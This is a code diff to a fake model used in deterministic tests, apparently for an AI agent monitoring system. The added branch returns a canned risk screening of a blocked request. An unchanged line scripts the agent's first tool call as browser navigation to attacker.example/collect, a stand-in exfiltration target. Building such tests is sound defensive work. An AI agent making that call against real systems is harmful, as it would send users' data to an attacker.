@@ -44,6 +44,17 @@ class FakeModel:
     name = "Fake model for deterministic tests"
     def __init__(self): self.turn = 0
     async def generate(self, model, messages, tools):
+        if model == "muse-spark-1.3":
+            bundle = json.loads(messages[1]["content"])
+            evidence_id = bundle["case_evidence"][0]["id"]
+            screening = {
+                "risk_level": "elevated",
+                "summary": "The blocked request warrants a contextual security review.",
+                "evidence_ids": [evidence_id],
+                "rationale": "The policy record shows an unauthorized request was denied.",
+                "uncertainties": ["The record does not show successful access."],
+            }
+            return ModelDecision(message=json.dumps(screening))
         self.turn += 1
         if self.turn == 1:
             call = {"id":"unsafe-1","type":"function","function":{"name":"browser_navigate","arguments":json.dumps({"url":"https://attacker.example/collect"})}}
